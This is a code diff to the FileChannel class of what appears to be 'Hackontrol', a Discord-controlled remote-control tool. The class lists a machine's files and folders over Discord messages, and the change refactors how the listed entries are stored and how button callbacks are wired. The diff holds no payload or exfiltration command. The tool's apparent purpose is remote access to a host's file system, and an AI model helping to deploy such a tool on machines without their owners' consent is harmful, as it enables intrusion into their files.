@@ -25,7 +25,13 @@ public class FileChannel extends HackontrolChannel {
 
 	private static final String QUERY_FILE_BUTTON_IDENTIFIER = "queryFile";
 
+	private final List<FileEntry> fileList;
+
 	private File filePointer;
+
+	public FileChannel() {
+		this.fileList = new ArrayList<>();
+	}
 
 	@Override
 	public String getName() {
@@ -80,15 +86,20 @@ public class FileChannel extends HackontrolChannel {
 		builder.append("**");
 		builder.append(this.filePointer == null ? "SYSTEMROOT" : this.filePointer.getAbsolutePath().replace("\\", "\\\\"));
 		builder.append("**");
+		this.fileList.clear();
 
 		if(!fileList.isEmpty()) {
 			builder.append("\n**File**");
 
 			for(int i = 0; i < fileList.size(); i++) {
+				FileEntry entry = new FileEntry();
+				entry.ordinal = ordinal++;
+				entry.file = fileList.get(i);
+				this.fileList.add(entry);
 				builder.append('\n');
-				builder.append(ordinal++);
+				builder.append(entry.ordinal);
 				builder.append(") `");
-				builder.append(fileList.get(i).getName());
+				builder.append(entry.file.getName());
 				builder.append('`');
 			}
 		}
@@ -97,10 +108,14 @@ public class FileChannel extends HackontrolChannel {
 			builder.append("\n**Folder**");
 
 			for(int i = 0; i < folderList.size(); i++) {
+				FileEntry entry = new FileEntry();
+				entry.ordinal = ordinal++;
+				entry.file = folderList.get(i);
+				this.fileList.add(entry);
 				builder.append('\n');
-				builder.append(ordinal++);
+				builder.append(entry.ordinal);
 				builder.append(") `");
-				builder.append(folderList.get(i).getName());
+				builder.append(entry.file.getName());
 				builder.append('`');
 			}
 		}
@@ -138,34 +153,42 @@ public class FileChannel extends HackontrolChannel {
 
 		if(messageList.isEmpty()) {
 			this.configActionRow(replyCallbackAction);
-			replyCallbackAction.queue();
+			replyCallbackAction.queue(ButtonManager :: dynamicButtonCallback);
 			return;
 		}
 
-		replyCallbackAction.queue(hook -> hook.retrieveOriginal().queue(message -> new Thread(() -> {
-			int size = messageList.size();
-			MessageCreateAction messageCreateAction;
+		replyCallbackAction.queue(hook -> {
+			ButtonManager.dynamicButtonCallback(hook);
+			hook.retrieveOriginal().queue(message -> new Thread(() -> {
+				int size = messageList.size();
+				MessageCreateAction messageCreateAction;
 
-			if(size == 1) {
-				messageCreateAction = channel.sendMessage(messageList.get(0));
-				this.configActionRow(messageCreateAction, message.getIdLong());
-			} else {
-				Object[] identifierList = new Object[size];
-				identifierList[0] = message.getIdLong();
+				if(size == 1) {
+					messageCreateAction = channel.sendMessage(messageList.get(0));
+					this.configActionRow(messageCreateAction, message.getIdLong());
+				} else {
+					Object[] identifierList = new Object[size];
+					identifierList[0] = message.getIdLong();
 
-				for(int i = 1; i < size; i++) {
-					identifierList[i] = channel.sendMessage(messageList.get(i - 1)).complete().getIdLong();
+					for(int i = 1; i < size; i++) {
+						identifierList[i] = channel.sendMessage(messageList.get(i - 1)).complete().getIdLong();
+					}
+
+					messageCreateAction = channel.sendMessage(messageList.get(size - 1));
+					this.configActionRow(messageCreateAction, identifierList);
 				}
 
-				messageCreateAction = channel.sendMessage(messageList.get(size - 1));
-				this.configActionRow(messageCreateAction, identifierList);
-			}
-
-			messageCreateAction.queue();
-		}).start()));
+				messageCreateAction.queue(ButtonManager :: dynamicButtonCallback);
+			}).start());
+		});
 	}
 
 	private void configActionRow(MessageCreateRequest<?> request, Object... messageIdentifiers) {
 		request.addActionRow(ButtonManager.selfDelete(ButtonStyle.DANGER, "Delete", messageIdentifiers));
+	}
+
+	private static class FileEntry {
+		private int ordinal;
+		private File file;
 	}
 }
